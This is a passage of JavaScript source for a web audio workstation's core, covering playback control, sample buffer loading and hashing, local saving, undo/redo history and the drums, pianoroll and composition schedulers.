			patterns: () => this.composition.cmp.patterns,
			synth: id => this.composition.cmp.synths[ id ],
			synths: () => this.composition.cmp.synths,
			track: id => this.composition.cmp.tracks[ id ],
			tracks: () => this.composition.cmp.tracks,
		};

		wadrumrows.getAudioBuffer = this.get.audioBuffer;
		wadrumrows.getChannelInput = this.get.audioChanIn;
		wadrumrows.onstartdrum = rowId => this._call( "onstartdrum", rowId );
		wadrumrows.onstartdrumcut = rowId => this._call( "onstopdrumrow", rowId );
		this.setLoopRate( 60 );
		this.setCtx( ctx );
		this.destination.setGain( this.env.def_appGain );
	}

	setCtx( ctx ) {
		this.ctx = ctx;
		this._wadrumrows.setContext( ctx );
		this.destination.setCtx( ctx );
		this.composition.setCtx( ctx );
	}
	envChange( obj ) {
		Object.assign( this.env, obj );
		if ( "clockSteps" in obj ) {
			this._clockUpdate();
		}
	}
	callAction( action, ...args ) {
		const fn = DAWCore.actions[ action ];

		if ( !fn ) {
			console.error( `DAWCore: undefined action "${ action }"` );
		} else {
			const ret = GSUtils.deepFreeze( fn( ...args, this.get ) );

			if ( Array.isArray( ret ) ) {
				this.history.stackChange( ...ret );
			} else if ( ret ) {
				const undo = GSUtils.composeUndo( this.get.cmp(), ret );

				this.composition.change( ret, undo );
			}
		}
	}
	compositionNeedSave() {
		return !this.composition._saved;
	}
	getFocusedObject() {
		return this._focused;
	}
	getFocusedName() {
		return this._focusedStr;
	}
	compositionFocus( force ) {
		if ( this._focused !== this.composition ) {
			this._focusOn( "composition", force );
		}
	}
	pianorollFocus( force ) {
		if ( this._focused !== this.pianoroll && this.get.patternKeysOpened() ) {
			this._focusOn( "pianoroll", force );
		}
	}
	drumsFocus( force ) {
		if ( this._focused !== this.drums && this.get.patternDrumsOpened() ) {
			this._focusOn( "drums", force );
		}
	}
	isPlaying() {
		return this.composition.playing || this.pianoroll.playing || this.drums.playing;
	}
	togglePlay() {
		this.isPlaying() ? this.pause() : this.play();
	}
	play() {
		this._focused.play();
		this._call( "play", this._focusedStr );
	}
	pause() {
		this._focused.pause();
		this._call( "pause", this._focusedStr );
		this._clockUpdate();
	}
	stop() {
		this._focused.stop();
		this._call( "stop", this._focusedStr );
		this._call( "currentTime", this._focused.getCurrentTime(), this._focusedStr );
		this._clockUpdate();
	}
	setLoopRate( fps ) {
		this._loopMs = 1000 / fps | 0;
	}

	// private:
	// .........................................................................
	_startLoop() {
		this._clockUpdate();
		this._loop();
	}
	_stopLoop() {
		clearTimeout( this._frameId );
		cancelAnimationFrame( this._frameId );
	}
	_loop() {
		const anData = this.destination.analyserFillData();

		if ( anData ) {
			this.composition.updateChanAudioData();
			this._call( "analyserFilled", anData );
		}
		if ( this.isPlaying() ) {
			const beat = this._focused.getCurrentTime();

			this._call( "currentTime", beat, this._focusedStr );
			this._clockUpdate();
		}
		this._frameId = this._loopMs < 20
			? requestAnimationFrame( this._loop )
			: setTimeout( this._loop, this._loopMs );
	}
	_clockUpdate() {
		this._call( "clockUpdate", this._focused.getCurrentTime() );
	}
	_focusOn( focusedStr, force ) {
		if ( force === "-f" || !this.isPlaying() ) {
			this.pause();
			this._focused = this[ focusedStr ];
			this._focusedStr = focusedStr;
			this._call( "focusOn", "composition", focusedStr === "composition" );
			this._call( "focusOn", "pianoroll", focusedStr === "pianoroll" );
			this._call( "focusOn", "drums", focusedStr === "drums" );
			this._clockUpdate();
		}
	}
	_call( cbName, ...args ) {
		const fn = this.cb[ cbName ];

		return fn && fn( ...args );
	}
}

DAWCore.json = { effects: {} };
DAWCore.utils = {};
DAWCore.common = {};
DAWCore.actions = {};
DAWCore.controllers = {};
DAWCore.controllersFx = {};

/*
1. The getter 'keys' and 'drums' can't use their singular form like the others getters
   because 'key' and 'drum' are refering to the objects contained in ONE 'keys' or 'drums'.
   So `keys[0]` is a 'keys' not a 'key', a 'key' would be `keys[0][0]`.
*/

DAWCore.Buffers = class {
	constructor( daw ) {
		this.daw = daw;
		this._files = new Map();
	}

	empty() {
		this._files.clear();
	}
	getBuffer( buf ) {
		return this._files.get( buf.hash || buf.url );
	}
	getSize() {
		return this._files.size;
	}
	setBuffer( obj ) {
		const buf = { ...obj },
			url = buf.url,
			key = buf.hash || url;

		this._files.set( key, buf );
		return !url
			? Promise.resolve( buf )
			: fetch( `../assets/samples/${ url }` )
				.then( res => res.arrayBuffer() )
				.then( arr => this.daw.ctx.decodeAudioData( arr ) )
				.then( buffer => {
					buf.buffer = buffer;
					buf.duration = +buffer.duration.toFixed( 4 );
					return buf;
				} );
	}
	loadFiles( files ) {
		return new Promise( res => {
			const newBuffers = [],
				knownBuffers = [],
				failedBuffers = [];
			let nbDone = 0;

			Array.from( files ).forEach( file => {
				this._getBufferFromFile( file )
					.then( ( [ hash, buffer ] ) => {
						const buf = {
								hash,
								buffer,
								type: file.type,
								name: file.name,
								duration: +buffer.duration.toFixed( 4 ),
							},
							old = this.getBuffer( buf );

						if ( !old ) {
							newBuffers.push( buf );
						} else if ( !old.buffer ) {
							knownBuffers.push( buf );
						}
					}, () => {
						failedBuffers.push( {
							type: file.type,
							name: file.name,
						} );
					} )
					.finally( () => {
						if ( ++nbDone === files.length ) {
							newBuffers.forEach( this.setBuffer, this );
							knownBuffers.forEach( this.setBuffer, this );
							res( { newBuffers, knownBuffers, failedBuffers } );
						}
					} );
			} );
		} );
	}

	// private:
	_getBufferFromFile( file ) {
		return new Promise( ( res, rej ) => {
			const reader = new FileReader();

			reader.onload = e => {
				const buf = e.target.result,
					hash = this._hashBuffer_v1( new Uint8Array( buf ) ); // 1.

				this.daw.ctx.decodeAudioData( buf ).then( audiobuf => {
					res( [ hash, audiobuf ] );
				}, rej );
			};
			reader.readAsArrayBuffer( file );
		} );
	}
	_hashBuffer_v1( u8buf ) {
		const hash = new Uint8Array( 19 ),
			len = `${ u8buf.length }`.padStart( 9, "0" );
		let i = 0,
			ind = 0;

		for ( const u8 of u8buf ) {
			hash[ ind ] += u8;
			if ( ++ind >= 19 ) {
				ind = 0;
			}
			if ( ++i >= 1000000 ) {
				break;
			}
		}
		return `1-${ len }-${ Array.from( hash )
			.map( u8 => u8.toString( 16 ).padStart( 2, "0" ) )
			.join( "" ) }`;
	}
};

/*
1. the hash is calculed before the data decoded
   to bypass the "neutered ArrayBuffer" error.
*/

DAWCore.LocalStorage = Object.freeze( {
	put( id, cmp ) {
		const cpy = GSUtils.jsonCopy( cmp );

		DAWCore.Composition.epure( cpy );
		localStorage.setItem( id, JSON.stringify( cpy ) );
	},
	delete( id ) {
		localStorage.removeItem( id );
	},
	has( id ) {
		return id in localStorage;
	},
	get( id ) {
		try {
			const cmp = JSON.parse( localStorage.getItem( id ) );

			return id === cmp.id ? cmp : null;
		} catch ( e ) {
			return null;
		}
	},
	getAll() {
		const cmps = Object.keys( localStorage )
				.reduce( ( arr, id ) => {
					const cmp = this.get( id );

					cmp && arr.push( cmp );
					return arr;
				}, [] );

		cmps.sort( ( a, b ) => a.savedAt < b.savedAt );
		return cmps;
	},
} );

DAWCore.Destination = class {
	constructor( daw ) {
		this.daw = daw;
		this._gain = 1;
		this.empty();
	}

	getDestination() {
		return this._inputNode;
	}
	getGain() {
		return this._gain;
	}
	setGain( v ) {
		this._gain = v;
		this._gainNode.gain.value = v * v;
	}
	empty() {
		this._gainNode && this._gainNode.disconnect();
		this._inputNode && this._inputNode.disconnect();
		this._analyserNode && this._analyserNode.disconnect();
		this._gainNode =
		this._inputNode =
		this._analyserNode =
		this._analyserData = null;
	}
	setCtx( ctx ) {
		const offline = ctx instanceof OfflineAudioContext;

		this.empty();
		this.ctx = ctx;
		this._inputNode = ctx.createGain();
		this._gainNode = ctx.createGain();
		this._gainNode.connect( ctx.destination );
		this._inputNode.connect( this._gainNode );
		this.toggleAnalyser( !offline && this.daw.env.analyserEnable );
	}
	analyserFillData() {
		if ( this._analyserNode ) {
			this._analyserNode.getByteFrequencyData( this._analyserData );
			return this._analyserData;
		}
	}
	toggleAnalyser( b ) {
		if ( this._analyserNode ) {
			this._analyserNode.disconnect();
		}
		if ( b ) {
			const an = this.ctx.createAnalyser(),
				fftSize = this.daw.env.analyserFFTsize;

			this._analyserNode = an;
			this._analyserData = new Uint8Array( fftSize / 2 );
			an.fftSize = fftSize;
			an.smoothingTimeConstant = 0;
			an.connect( this._gainNode );
			this._inputNode.connect( an );
		} else {
			this._analyserNode =
			this._analyserData = null;
			this._inputNode.connect( this._gainNode );
		}
	}
};

DAWCore.History = class {
	constructor( daw ) {
		this.daw = daw;
		this._stack = [];
		this._stackInd = 0;
		this._stackCue = -1;
	}

	empty() {
		const stack = this._stack;

		while ( stack.length ) {
			this.daw._call( "historyDeleteAction", stack.pop() );
		}
		this._stackInd = 0;
	}
	stackChange( redo, msg ) {
		const stack = this._stack,
			undo = GSUtils.composeUndo( this.daw.composition.cmp, redo ),
			act = { redo, undo },
			desc = this.nameAction( act, msg );

		act.desc = desc.t;
		act.icon = desc.i;
		while ( stack.length > this._stackInd ) {
			this.daw._call( "historyDeleteAction", stack.pop() );
		}
		++this._stackInd;
		act.index = stack.push( act );
		this._change( Object.freeze( act ), "redo", "historyAddAction" );
	}
	getCurrentAction() {
		return this._stack[ this._stackInd - 1 ] || null;
	}
	goToAction( act ) {
		let n = act.index - this._stackInd;

		     if ( n < 0 ) { while ( n++ < 0 ) { this.undo(); } }
		else if ( n > 0 ) { while ( n-- > 0 ) { this.redo(); } }
		return false;
	}
	undo() {
		return this._stackInd > 0
			? this._change( this._stack[ --this._stackInd ], "undo", "historyUndo" )
			: false;
	}
	redo() {
		return this._stackInd < this._stack.length
			? this._change( this._stack[ this._stackInd++ ], "redo", "historyRedo" )
			: false;
	}

	// private:
	_change( act, undoredo, cbStr ) {
		const obj = act[ undoredo ],
			prevObj = undoredo === "undo" ? act.redo : act.undo;

		this.daw._call( cbStr, act );
		this.daw.composition.change( obj, prevObj );
		return obj;
	}
};

DAWCore.History.prototype.nameAction = function( act, msg ) {
	const [ part, actionName, ...args ] = msg || [],
		fn = DAWCore.History.actionsToText[ part ]?.[ actionName ],
		[ i, t ] = fn ? fn( ...args ) : [ "close", "undefined" ];

	if ( !fn ) {
		console.error( `DAWCore: description 404 for "${ part }.${ actionName }"` );
	}
	return { i, t };
};

DAWCore.History.actionsToText = {
	cmp: {
		renameComposition: ( old, neww ) => [ "pen", `rename compo "${ old || "untitled" }" to "${ neww }"` ],
		changeTempo: ( bpm, bPM, sPB ) => [ "clock", `new tempo ${ bpm } (${ bPM }/${ sPB })` ],
		changeLoop: ( a, b ) => [ "loop", `change loop ${ a } -> ${ b }` ],
		removeLoop: () => [ "loop", "remove loop" ],
	},
	tracks: {
		renameTrack: ( old, neww ) => [ "pen", `rename track "${ old }" -> "${ neww }"` ],
		toggleTrack: ( tr, b ) => [ b ? "unmute" : "mute", `${ b ? "unmute" : "mute" } track "${ tr }"` ],
		toggleSoloTrack: ( tr, b ) => [ b ? "unmute" : "mute", `${ b ? "unmute all tracks" : `mute all tracks except "${ tr }"` }` ],
	},
	blocks: {
		addBlock: pat => [ "plus", `add a new ${ pat } block` ],
		moveBlocks: len => [ "arrows", `move ${ GSUtils.plural( len, "block" ) }` ],
		selectBlocks: len => [ "mouse", `select ${ GSUtils.plural( len, "block" ) }` ],
		removeBlocks: len => [ "erase", `remove ${ GSUtils.plural( len, "block" ) }` ],
		cropEndBlocks: len => [ "crop", `crop-end ${ GSUtils.plural( len, "block" ) }` ],
		cropStartBlocks: len => [ "crop", `crop-start ${ GSUtils.plural( len, "block" ) }` ],
		unselectBlock: () => [ "mouse", `unselect ${ GSUtils.plural( 1, "block" ) }` ],
		unselectAllBlocks: len => [ "mouse", `unselect ${ GSUtils.plural( len, "block" ) }` ],
		duplicateSelectedBlocks: len => [ "plus", `duplicate ${ GSUtils.plural( len, "block" ) }` ],
	},
	synth: {
		addOscillator: syn => [ "oscillator", `${ syn }: add osc` ],
		removeOscillator: syn => [ "oscillator", `${ syn }: remove osc` ],
		reorderOscillator: syn => [ "sort", `${ syn }: reorder oscs` ],
		changeOscillator: ( syn, prop, val ) => [ "oscillator", `${ syn }: change osc ${ prop } -> ${ val }` ],
		toggleEnv: ( syn, b ) => [ "osc-sine", `${ syn }: ${ b ? "enable" : "disable" } envelope` ],
		changeEnv: ( syn, prop, val ) => [ "osc-sine", `${ syn }: envelope's ${ prop } = ${ val }` ],
		toggleLFO: ( syn, b ) => [ "osc-sine", `${ syn }: ${ b ? "enable" : "disable" } LFO` ],
		changeLFO: ( syn, prop, val ) => [ "osc-sine", `${ syn }: LFO's ${ prop } = ${ val }` ],
	},
	synths: {
		addSynth: syn => [ "oscillator", `add new synth "${ syn }"` ],
		renameSynth: ( old, neww ) => [ "pen", `rename synth "${ old }" -> "${ neww }"` ],
		removeSynth: syn => [ "minus", `remove synth "${ syn }"` ],
		redirectSynth: ( syn, chanDest ) => [ "redirect", `redirect synth "${ syn }" to chan "${ chanDest }"` ],
	},
	channels: {
		addChannel: chan => [ "plus", `mixer: new channel "${ chan }"`, ],
		removeChannel: chan => [ "minus", `mixer: remove "${ chan }"`, ],
		reorderChannel: chan => [ "sort", `mixer: reorder "${ chan }"`, ],
		renameChannel: ( old, neww ) => [ "pen", `mixer: rename "${ old }" -> "${ neww }"` ],
		toggleChannel: ( chan, b ) => [ b ? "unmute" : "mute", `mixer: ${ b ? "unmute" : "mute" } "${ chan }"`, ],
		changeChannel: ( chan, prop, val ) => [ "mixer", `mixer: "${ chan }" ${ prop }: ${ val }`, ],
		redirectChannel: ( chan, chanDest ) => [ "redirect", `mixer: redirect "${ chan }" to "${ chanDest }"`, ],
	},
	patterns: {
		addPattern: ( type, pat ) => [ "plus", `add new ${ type } "${ pat }"` ],
		addPatternKeys: ( pat, syn ) => [ "plus", `add new keys "${ pat }" of synth "${ syn }"` ],
		renamePattern: ( type, old, neww ) => [ "pen", `rename ${ type } "${ old }" -> "${ neww }"` ],
		removePattern: ( type, pat ) => [ "minus", `remove ${ type } "${ pat }"` ],
		reorderPattern: ( type, pat ) => [ "sort", `reorder ${ type } "${ pat }"` ],
		clonePattern: ( type, pat, patSrc ) => [ "clone", `clone ${ type } "${ patSrc }" to "${ pat }"` ],
		redirectPatternBuffer: ( pat, chanDest ) => [ "redirect", `redirect buffer "${ pat }" to chan "${ chanDest }"` ],
		redirectPatternKeys: ( pat, syn ) => [ "redirect", `redirect keys "${ pat }" to synth "${ syn }"` ],
	},
	effects: {
		addEffect: ( dest, type ) => [ "effects", `fx: new ${ type } on ${ dest }`, ],
		toggleEffect: ( dest, type, b ) => [ b ? "unmute" : "mute", `fx: ${ b ? "unmute" : "mute" } ${ type } of ${ dest }`, ],
		removeEffect: ( dest, type ) => [ "minus", `fx: remove ${ type } of ${ dest }`, ],
		changeEffect: ( dest, type, prop ) => [ "effects", `fx: change ${ type }'s ${ prop } of ${ dest }` ],
	},
	drumrows: {
		addDrumrow: row => [ "drums", `drumrows: new "${ row }"` ],
		removeDrumrow: row => [ "drums", `drumrows: remove "${ row }"` ],
		reorderDrumrow: row => [ "drums", `drumrows: reorder "${ row }"` ],
		changeDrumrow: ( row, prop, val ) => [ "drums", `drumrows: "${ row }" ${ prop }: ${ val }` ],
		changeDrumrowPattern: ( row, newPat ) => [ "drums", `drumrows: "${ row }" -> "${ newPat }"` ],
		toggleDrumrow: ( row, b ) => [ "drums", `drumrows: ${ b ? "unmute" : "mute" } "${ row }"` ],
		toggleSoloDrumrow: ( row, b ) => [ "drums", `drumrows: ${ b ? "unmute all" : `mute all except "${ row }"` }` ],
	},
	drums: {
		addDrums: ( pat, row, nb ) => [ "drums", `drums: add ${ nb } "${ row }" in "${ pat }"` ],
		removeDrums: ( pat, row, nb ) => [ "drums", `drums: remove ${ nb } "${ row }" in "${ pat }"` ],
		changeDrumsProps: ( pat, row, prop, nb ) => [ "drums", `drums: set ${ prop } to ${ nb } "${ row }" in "${ pat }"` ],
	},
	keys: {
		addKey: pat => [ "keys", `add a new key in "${ pat }"` ],
		moveKeys: ( pat, len ) => [ "arrows", `keys: move ${ GSUtils.plural( len, "key" ) } in "${ pat }"` ],
		removeKeys: ( pat, len ) => [ "erase", `keys: remove ${ GSUtils.plural( len, "key" ) } in "${ pat }"` ],
		selectKeys: ( pat, len ) => [ "mouse", `keys: select ${ GSUtils.plural( len, "key" ) } in "${ pat }"` ],
		cropEndKeys: ( pat, len ) => [ "crop", `keys: crop ${ GSUtils.plural( len, "key" ) } in "${ pat }"` ],
		redirectKey: ( pat, b ) => [ "glissando", `${ b ? "add" : "remove" } a glissando in "${ pat }"` ],
		unselectKey: pat => [ "mouse", `keys: unselect ${ GSUtils.plural( 1, "key" ) } in "${ pat }"` ],
		unselectAllKeys: ( pat, len ) => [ "mouse", `unselect ${ GSUtils.plural( len, "key" ) } in "${ pat }"` ],
		changeKeysEnv: ( pat, len, prop ) => [ "keys", `keys: change ${ GSUtils.plural( len, "key", "'s" ) } ${ prop } in "${ pat }"` ],
		changeKeysProps: ( pat, prop, len ) => [ "keys", `keys: change ${ GSUtils.plural( len, "key", "'s" ) } ${ prop } in "${ pat }"` ],
		cloneSelectedKeys: ( pat, len ) => [ "keys", `clone ${ GSUtils.plural( len, "key" ) } in "${ pat }"` ],
	},
};

DAWCore.Drums = class {
	constructor( daw ) {
		const waDrums = new gswaDrumsScheduler( daw.ctx );

		this.daw = daw;
		this.looping =
		this.playing = true;
		this.loopA =
		this.loopB = null;
		this.duration = 0;
		this._ctx = daw.ctx;
		this._waDrums = waDrums;
		Object.seal( this );

		waDrums.setDrumrows( daw._wadrumrows );
	}

	change( patObj, drumsObj ) {
		if ( drumsObj ) {
			this._waDrums.change( drumsObj );
		}
		if ( patObj && "duration" in patObj ) {
			this.duration = patObj.duration;
			if ( !this.looping && this.playing ) {
				this._waDrums.scheduler.setLoopBeat( 0, this.duration );
			}
		}
	}
	openPattern( id ) {
		const daw = this.daw,
			wasPlaying = this.playing;

		id ? daw.drumsFocus()
			: daw.compositionFocus( "-f" );
		if ( wasPlaying ) {
			daw.stop();
			daw.stop();
		}
		this._waDrums.scheduler.empty();
		if ( id ) {
			const pat = daw.get.pattern( id );

			this.change( pat, daw.get.drums( pat.drums ) );
			if ( wasPlaying ) {
				daw.play();
			}
		}
	}

	// controls
	// .........................................................................
	getCurrentTime() {
		return this._waDrums.scheduler.getCurrentOffsetBeat();
	}
	setCurrentTime( t ) {
		this._waDrums.scheduler.setCurrentOffsetBeat( t );
		this.daw._call( "currentTime", this.getCurrentTime(), "drums" );
		this.daw._clockUpdate();
	}
	setBPM( bpm ) {
		this._waDrums.scheduler.setBPM( bpm );
	}
	setLoop( a, b ) {
		this.loopA = a;
		this.loopB = b;
		this.looping = true;
		this._waDrums.scheduler.setLoopBeat( a, b );
	}
	clearLoop() {
		this.loopA =
		this.loopB = null;
		this.looping = false;
		this._waDrums.scheduler.setLoopBeat( 0, this.duration || this.daw.get.beatsPerMeasure() );
	}
	changeLiveDrumrow( rowId, prop, val ) {
		this.daw._wadrumrows.change( { drumrows: { [ rowId ]: { [ prop ]: val } } } );
	}
	startLiveDrum( rowId ) {
		this.daw._wadrumrows.startLiveDrum( rowId );
	}
	stopLiveDrum( rowId ) {
		this.daw._wadrumrows.stopLiveDrum( rowId );
		this.daw._call( "onstopdrumrow", rowId );
	}
	play() {
		if ( !this.playing ) {
			const a = this.looping ? this.loopA : 0,
				b = this.looping ? this.loopB : this.duration;

			this.playing = true;
			this._waDrums.scheduler.setLoopBeat( a, b );
			this._waDrums.scheduler.startBeat( 0, this.getCurrentTime() );
		}
	}
	pause() {
		if ( this.playing ) {
			this.playing = false;
			this._waDrums.stop();
		}
	}
	stop() {
		if ( this.playing ) {
			this.pause();
			this.setCurrentTime( this.loopA || 0 );
		} else {
			this.setCurrentTime( 0 );
		}
	}
};

DAWCore.Pianoroll = class {
	constructor( daw ) {
		const waKeys = new gswaKeysScheduler( daw.ctx );

		this.daw = daw;
		this.keys = {};
		this.looping =
		this.playing = false;
		this._synth =
		this.loopA =
		this.loopB = null;
		this.duration = 0;
		this._ctx = daw.ctx;
		this._waKeys = waKeys;
		this._keysStartedLive = {};
	}

	change( patObj, keysObj ) {
		this._waKeys.change( keysObj );
		if ( patObj && "duration" in patObj ) {
			this.duration = patObj.duration;
			if ( !this.looping && this.playing ) {
				this._waKeys.scheduler.setLoopBeat( 0, this.duration );
			}
		}
	}
	setSynth( id ) {
		const syn = id ? this.daw.get.audioSynth( id ) : null,
			wasPlaying = this.playing;

		if ( syn !== this._synth ) {
			if ( wasPlaying ) {
				this.pause();
			}
			this._synth = syn;
			this._waKeys.setSynth( syn );
			if ( wasPlaying ) {
				this.play();
			}
		}
	}
	openPattern( id ) {
		const daw = this.daw,
			wasPlaying = this.playing;

		id ? daw.pianorollFocus()
			: daw.compositionFocus( "-f" );
		if ( wasPlaying ) {
			daw.stop();
			daw.stop();
		}
		this._waKeys.scheduler.empty();
		if ( id ) {
			const pat = daw.get.pattern( id );

			this.setSynth( pat.synth );
			this.change( pat, daw.get.keys( pat.keys ) );
			if ( wasPlaying ) {
				daw.play();
			}
		}
	}

	// controls
	// ........................................................................
	getCurrentTime() {
		return this._waKeys.scheduler.getCurrentOffsetBeat();
	}
	setCurrentTime( t ) {
		this._waKeys.scheduler.setCurrentOffsetBeat( t );
		this.daw._call( "currentTime", this.getCurrentTime(), "pianoroll" );
		this.daw._clockUpdate();
	}
	setBPM( bpm ) {
		this._waKeys.scheduler.setBPM( bpm );
	}
	setLoop( a, b ) {
		this.loopA = a;
		this.loopB = b;
		this.looping = true;
		this._waKeys.scheduler.setLoopBeat( a, b );
	}
	clearLoop() {
		this.loopA =
		this.loopB = null;
		this.looping = false;
		this._waKeys.scheduler.setLoopBeat( 0, this.duration || this.daw.get.beatsPerMeasure() );
	}
	liveKeydown( midi ) {
		if ( !( midi in this._keysStartedLive ) ) {
			this._keysStartedLive[ midi ] = this._synth.startKey( [ [ null, {
				key: midi,
				pan: 0,
				gain: .8,
				lowpass: 1,
				highpass: 1,
			} ] ], this._waKeys.scheduler.currentTime(), 0, Infinity );
		}
	}
	liveKeyup( midi ) {
		if ( this._keysStartedLive[ midi ] ) {
			this._synth.stopKey( this._keysStartedLive[ midi ] );
			delete this._keysStartedLive[ midi ];
		}
	}
	play() {
		if ( !this.playing ) {
			const a = this.looping ? this.loopA : 0,
				b = this.looping ? this.loopB : this.duration;

			this.playing = true;
			this._waKeys.scheduler.setLoopBeat( a, b );
			this._waKeys.scheduler.startBeat( 0, this.getCurrentTime() );
		}
	}
	pause() {
		if ( this.playing ) {
			this.playing = false;
			this._waKeys.stop();
		}
	}
	stop() {
		if ( this.playing ) {
			this.pause();
			this.setCurrentTime( this.loopA || 0 );
		} else {
			this.setCurrentTime( 0 );
		}
	}
};

DAWCore.Composition = class {
	constructor( daw ) {
		const sch = new gswaScheduler(),
			wamix = new gswaMixer(),
			wafxs = new gswaEffects( {
				getChanInput: wamix.getChanInput.bind( wamix ),
				getChanOutput: wamix.getChanOutput.bind( wamix ),
			} );

		this.daw = daw;
		this.cmp = null;
		this.loaded =
		this.playing = false;
		this._saved = true;
		this._sched = sch;
		this._wamixer = wamix;
		this._waeffects = wafxs;
		this._synths = new Map();
		this._startedSched = new Map();
		this._startedBuffers = new Map();
		this._actionSavedOn = null;
		sch.currentTime = () => this.ctx.currentTime;
		sch.ondatastart = this._onstartBlock.bind( this );
		sch.ondatastop = this._onstopBlock.bind( this );
	}

	// un/load, change, save
	// .........................................................................
	setCtx( ctx ) {
		gswaPeriodicWaves.clearCache();
		this.ctx = ctx;
		this._wamixer.setContext( ctx ); // 1.
		this._wamixer.connect( this.daw.get.audioDestination() );
		this._waeffects.setContext( ctx );
		this._synths.forEach( ( syn, synId ) => {
			syn.setContext( ctx );
			syn.output.disconnect();
			syn.output.connect( this.daw.get.audioChanIn( this.cmp.synths[ synId ].dest ) );
		} );
	}
	load( cmpOri ) {
		return new Promise( ( res, rej ) => {
			const cmp = GSUtils.jsonCopy( cmpOri );

			if ( DAWCore.Composition.format( cmp ) ) {
				this.unload();
				res( cmp );
			} else {
				rej();
			}
		} ).then( cmp => {
			this.cmp = cmp;
			this.loaded = true;
			Object.entries( cmp.buffers ).forEach( kv => {
				this.daw.buffers.setBuffer( kv[ 1 ] )
					.then( buf => {
						if ( buf.buffer ) {
							this.daw._call( "buffersLoaded", { [ kv[ 0 ] ]: buf } );
						}
					} );
			} );
			this.change( cmp, {
				keys: {},
				drums: {},
				synths: {},
				blocks: {},
				buffers: {},
				drumrows: {},
				channels: {},
				patterns: {},
			} );
			this._actionSavedOn = null;
			this._saved = cmp.options.saveMode === "cloud" ||
				DAWCore.LocalStorage.has( cmp.id ) || !cmp.savedAt;
			this.daw._call( "compositionSavedStatus", cmp, this._saved );
			return cmp;
		} );
	}
	unload() {
		if ( this.loaded ) {
			const d = this._sched.data;

			this.loaded = false;
			this._waeffects.clear(); // 1.
			this._wamixer.clear();
			this._sched.stop();
			Object.keys( d ).forEach( id => delete d[ id ] );
			this._synths.clear();
			this.daw._wadrumrows.clear();
			this._saved = true;
			this.daw._call( "compositionSavedStatus", this.cmp, true );
			this.cmp = null;
		}
	}
	save() {
		if ( !this._saved ) {
			this._saved = true;
			this._actionSavedOn = this.daw.history.getCurrentAction();
			this.cmp.savedAt = Math.floor( Date.now() / 1000 );
			return true;
		}
	}
	updateChanAudioData() {
		const mix = this._wamixer,
			fn = this.daw._call.bind( this.daw, "channelAnalyserFilled" );

		Object.keys( this.daw.get.channels() ).forEach( chanId => {
			mix.fillAudioData( chanId );
			fn( chanId, mix.audioDataL, mix.audioDataR );
		} );
	}

	// controls
	// .........................................................................
	getCurrentTime() {
		return this._sched.getCurrentOffsetBeat();
	}
	setCurrentTime( t ) {
		this._sched.setCurrentOffsetBeat( t );
		this.daw._call( "currentTime", this.getCurrentTime(), "composition" );
		this.daw._clockUpdate();
	}
	play() {
		if ( !this.playing ) {
			this.playing = true;
			this._start( this.getCurrentTime() );
		}
	}
	pause() {
		if ( this.playing ) {
			this.playing = false;
			this._sched.stop();
		}
	}
	stop() {
		if ( this.playing ) {
			this.pause();
			this.setCurrentTime( this.cmp.loopA || 0 );
		} else {
			this.setCurrentTime( 0 );
		}
	}

	// .........................................................................
	_setLoop( a, b ) {
		if ( Number.isFinite( a ) ) {
			this._sched.setLoopBeat( a, b );
		} else {
			this._sched.setLoopBeat( 0, this.cmp.duration || this.cmp.beatsPerMeasure );
		}
	}
	_start( offset ) {
		const sch = this._sched;

		if ( this.ctx instanceof OfflineAudioContext ) {
			sch.clearLoop();
			sch.enableStreaming( false );
			sch.startBeat( 0 );
		} else {
			this._setLoop( this.cmp.loopA, this.cmp.loopB );
			sch.enableStreaming( true );
			sch.startBeat( 0, offset );
		}
	}

	// .........................................................................
	assignPatternChange( patId, obj ) {
		this._startedSched.forEach( ( [ patId2, sched ] ) => {
			if ( patId2 === patId ) {
				sched.change( obj );
			}
		} );
	}
	redirectPatternBuffer( patId, chanId ) {
		this._startedBuffers.forEach( ( [ patId2, absn ] ) => {
			if ( patId2 === patId ) {
				absn.disconnect();
				absn.connect( this.daw.get.audioChanIn( chanId ) );
			}
		} );
	}

	// .........................................................................
	_onstartBlock( startedId, blcs, when, off, dur ) {
		const cmp = this.cmp,
			blc = blcs[ 0 ][ 1 ];

		if ( cmp.tracks[ blc.track ].toggle ) {
			const patId = blc.pattern,
				pat = cmp.patterns[ patId ];

			switch ( pat.type ) {
				case "buffer": {
					const buf = this.daw.get.audioBuffer( pat.buffer );

					if ( buf ) {
						const absn = this.ctx.createBufferSource();

						absn.buffer = buf;
						absn.connect( this.daw.get.audioChanIn( pat.dest ) );
						absn.start( when, off, dur );
						this._startedBuffers.set( startedId, [ patId, absn ] );
					}
				} break;
				case "keys": {
					const waKeys = new gswaKeysScheduler( this.ctx );

					this._startedSched.set( startedId, [ patId, waKeys ] );
					waKeys.scheduler.setBPM( cmp.bpm );
					waKeys.setSynth( this.daw.get.audioSynth( pat.synth ) );
					waKeys.change( cmp.keys[ pat.keys ] );
					waKeys.start( when, off, dur );
				} break;
				case "drums": {
					const waDrums = new gswaDrumsScheduler( this.ctx );

					this._startedSched.set( startedId, [ patId, waDrums ] );
					waDrums.scheduler.setBPM( cmp.bpm );
					waDrums.setDrumrows( this.daw._wadrumrows );
					waDrums.change( cmp.drums[ pat.drums ] );
					waDrums.start( when, off, dur );
				} break;
			}
		}
	}
	_onstopBlock( startedId ) {
		const objStarted =
				this._startedSched.get( startedId ) ||
				this._startedBuffers.get( startedId );

		if ( objStarted ) {
			objStarted[ 1 ].stop();
			this._startedSched.delete( startedId );
			this._startedBuffers.delete( startedId );
		}
	}
};

/*
1. The order between the mixer and the effects is important.
*/

DAWCore.Composition.epure = function( cmp ) {
	delete cmp.options;
	if ( cmp.loopA == null || cmp.loopB == null ) {
		delete cmp.loopA;
		delete cmp.loopB;
	}
	Object.values( cmp.drumrows ).forEach( row => {
		if ( row.toggle ) { delete row.toggle; }
	} );
	Object.values( cmp.tracks ).forEach( tr => {
		if ( !tr.name ) { delete tr.name; }
		if ( tr.toggle ) { delete tr.toggle; }
	} );
	Object.values( cmp.blocks ).forEach( blc => {
		if ( !blc.offset ) { delete blc.offset; }
		if ( !blc.selected ) { delete blc.selected; }
		if ( !blc.durationEdited ) { delete blc.durationEdited; }
	} );
	Object.values( cmp.keys ).forEach( keys => {
		Object.values( keys ).forEach( key => {
			if ( !key.offset ) { delete key.offset; }
			if ( !key.selected ) { delete key.selected; }
			if ( key.prev == null ) { delete key.prev; }
			if ( key.next == null ) { delete key.next; }
		} );
	} );
	return cmp;
};

DAWCore.Composition.format = function( cmp ) {
	const blcsValues = Object.values( cmp.blocks );
	let orderDefault = 0;

